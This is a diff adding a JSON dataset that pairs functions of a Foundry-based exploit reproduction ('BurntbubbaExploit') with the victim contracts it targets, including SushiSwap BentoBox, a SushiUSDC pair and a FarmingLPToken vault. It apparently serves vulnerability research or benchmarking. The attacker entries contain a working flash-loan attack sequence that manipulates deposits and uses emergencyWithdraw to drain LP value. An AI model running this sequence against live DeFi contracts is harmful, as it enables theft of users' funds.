@@ -1,0 +1,184 @@
+[
+  {
+    "contract/interface": "ISushi",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "    function flashLoan(\n        IFlashBorrower borrower,\n        address receiver,\n        IERC20 token,\n        uint256 amount,\n        bytes calldata data\n    ) public {\n        uint256 fee = amount.mul(FLASH_LOAN_FEE) / FLASH_LOAN_FEE_PRECISION;\n        token.safeTransfer(receiver, amount);\n\n        borrower.onFlashLoan(msg.sender, token, amount, fee, data);\n\n        require(_tokenBalanceOf(token) >= totals[token].addElastic(fee.to128()), \"BentoBox: Wrong amount\");\n        emit LogFlashLoan(address(borrower), token, amount, fee, receiver);\n    }\n\n    /// @notice Support for batched flashloans. Useful to request multiple different `tokens` in a single transaction.\n    /// @param borrower The address of the contract that implements and conforms to `IBatchFlashBorrower` and handles the flashloan.\n    /// @param receivers An array of the token receivers. A one-to-one mapping with `tokens` and `amounts`.\n    /// @param tokens The addresses of the tokens.\n    /// @param amounts of the tokens for each receiver.\n    /// @param data The calldata to pass to the `borrower` contract.\n    // F5 - Checks-Effects-Interactions pattern followed? (SWC-107)\n    // F5: Not possible to follow this here, reentrancy has been reviewed\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "onFlashLoan",
+    "original_code": "    function onFlashLoan(\n        address caller,\n        address erc20Token,\n        uint256 amount,\n        uint256 feeAmount,\n        bytes calldata data\n    ) external {\n        approveAll();\n        addLiquidity(address(USDC), address(WETH), 2e6, 1e15);\n        addLiquidity(address(USDC), address(AST), 2e6, 10e3);\n        addLiquidity(address(SUSHI), address(AST), amount, 10e3);\n\n        address[] memory path0 = new address[](3);\n        path0[0] = address(USDC);\n        path0[1] = address(AST);\n        path0[2] = address(SUSHI);\n        address[] memory path1 = new address[](2);\n        path1[0] = address(WETH);\n        path1[1] = address(SUSHI);\n        FarmingLPToken.deposit(\n            SushiUSDC.balanceOf(address(this)), path0, path1, 0, address(this), block.timestamp + 1000\n        );\n        // Pull out value from original attack contract storage. Needed it for transfer amount calculation\n        uint256 value = uint256(vm.load(originalAttackContract, bytes32(uint256(10))));\n        uint256 totalWithdrawableLPs = FarmingLPToken.withdrawableTotalLPs();\n        uint256 totalShares = FarmingLPToken.totalShares();\n        uint256 transferAmount =\n            FarmingLPToken.balanceOf(address(this)) - ((value * totalShares) / totalWithdrawableLPs);\n        // In the attack tx amount of LPToken was transfered to exploiter eoa addr before making call to\n        // 'emergencyWithdraw'\n        FarmingLPToken.transfer(toAddr, transferAmount);\n        FarmingLPToken.emergencyWithdraw(address(this));\n        SushiUSDC.transfer(address(SushiUSDC), SushiUSDC.balanceOf(address(this)));\n        SushiUSDC.burn(address(this));\n        AST_SUSHI.transfer(address(AST_SUSHI), AST_SUSHI.balanceOf(address(this)));\n        AST_SUSHI.burn(address(this));\n\n        uint256 amountOut = feeAmount + (feeAmount / 10);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(SUSHI);\n        SushiRouter.swapTokensForExactTokens(amountOut, 200e15, path, address(this), block.timestamp + 1000);\n        SUSHI.transfer(address(SushiSwap), amount + feeAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        SushiSwap.flashLoan(address(this), address(this), address(SUSHI), 400_000e18, bytes(\"_\"));\n        USDC.transfer(address(Balancer), amounts[0]);\n        WETH.transfer(address(Balancer), amounts[1]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        toAddr = makeAddr(\"toAddr\");\n        vm.label(address(AST), \"AST\");\n        vm.label(address(SUSHI), \"SUSHI\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(SushiUSDC), \"SushiUSDC\");\n        vm.label(address(FarmingLPToken), \"FarmingLPToken\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(SushiSwap), \"SushiSwap\");\n        vm.label(address(SushiRouter), \"SushiRouter\");\n        vm.label(address(AST_SUSHI), \"AST_SUSHI\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BurntbubbaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // Attacking contract start AST amount\n        deal(address(AST), address(this), 2_062_557);\n        emit log_named_decimal_uint(\"Exploiter USDC balance before attack\", USDC.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), 18);\n\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(USDC);\n        tokens[1] = address(WETH);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 800e6;\n        amounts[1] = 50e16;\n        Balancer.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n\n        emit log_named_decimal_uint(\"Exploiter USDC balance after attack\", USDC.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "Swapin",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n      return allowed[_owner][_spender];\n    }\n\n    mapping (address => uint256) public balances; // *added public\n    mapping (address => mapping (address => uint256)) public allowed; // *added public\n}\n\n\n\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address _spender, uint256 _value) returns (bool success) {\n        allowed[msg.sender][_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address _owner) constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "burn",
+    "original_code": "    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20Uniswap(_token0).balanceOf(address(this));\n        uint balance1 = IERC20Uniswap(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20Uniswap(_token0).balanceOf(address(this));\n        balance1 = IERC20Uniswap(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISushiUSDC",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address _to, uint256 _value) returns (bool success) {\n        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n        balances[_to] += _value;\n        balances[_from] -= _value;\n        allowed[_from][msg.sender] -= _value;\n        Transfer(_from, _to, _value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFarmingLPToken",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(\n        uint256 amountLP,\n        address[] calldata path0,\n        address[] calldata path1,\n        uint256 amountMin,\n        address beneficiary,\n        uint256 deadline\n    ) external override nonReentrant {\n        if (block.timestamp > deadline) revert Expired();\n        _deposit(amountLP, path0, path1, amountMin, beneficiary);\n    }\n\n    function _deposit(\n        uint256 amountLP,\n        address[] calldata path0,\n        address[] calldata path1,\n        uint256 amountMin,\n        address beneficiary\n    ) internal {\n        if (path0[0] != token0 || path0[path0.length - 1] != sushi) revert InvalidPath();\n        if (path1[0] != token1 || path1[path1.length - 1] != sushi) revert InvalidPath();\n\n        IERC20(lpToken).safeTransferFrom(msg.sender, address(this), amountLP);\n\n        uint256 total = IUniswapV2Pair(lpToken).totalSupply();\n        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(lpToken).getReserves();\n        uint256 amount = UniswapV2Utils.quote(router, (reserve0 * amountLP) / total, path0) +\n            UniswapV2Utils.quote(router, (reserve1 * amountLP) / total, path1);\n\n        if (amount < amountMin) revert InsufficientAmount();\n\n        IMasterChef(masterChef).deposit(pid, amountLP);\n        _depositSushi();\n\n        _mint(beneficiary, amount);\n        withdrawableTotalLPs += amountLP;\n\n        emit Deposit(amount, amountLP, beneficiary);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFarmingLPToken",
+    "source_type": "victim_contract",
+    "function_name": "emergencyWithdraw",
+    "original_code": "    function emergencyWithdraw(address beneficiary) external override nonReentrant {\n        uint256 shares = sharesOf(msg.sender);\n        uint256 amountLP = (shares * withdrawableTotalLPs) / totalShares();\n        IMasterChef(masterChef).withdraw(pid, amountLP);\n\n        IERC20(lpToken).safeTransfer(beneficiary, amountLP);\n\n        _burn(msg.sender, shares);\n        withdrawableTotalLPs -= amountLP;\n\n        emit EmergencyWithdraw(shares, amountLP, beneficiary);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFarmingLPToken",
+    "source_type": "victim_contract",
+    "function_name": "totalShares",
+    "original_code": "    function totalShares() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IFarmingLPToken",
+    "source_type": "victim_contract",
+    "function_name": "withdrawableTotalLPs",
+    "original_code": "",
+    "description": ""
+  }
+]
